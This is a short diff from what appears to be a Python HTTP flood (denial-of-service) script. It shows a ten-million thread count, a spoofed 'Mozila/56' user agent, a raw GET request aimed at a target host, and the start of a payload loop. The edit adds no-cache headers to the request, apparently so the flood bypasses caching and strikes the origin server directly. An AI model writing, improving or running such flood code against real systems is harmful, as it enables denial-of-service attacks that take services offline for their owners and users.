@@ -8,7 +8,7 @@ count=2
 thr=10000000
 agent='Mozila/56'
 path='/'
-req = "GET %s HTTP/1.1\nUser-Agent: %s\r\nHost: %s\n\n"%(path, agent, target)
+req = "GET %s HTTP/1.1\nCache-Control: no-cache\nPragma: no-cache\nUser-Agent: %s\r\nHost: %s\n\n"%(path, agent, target)
 
 def payload():
     for i in range(count):
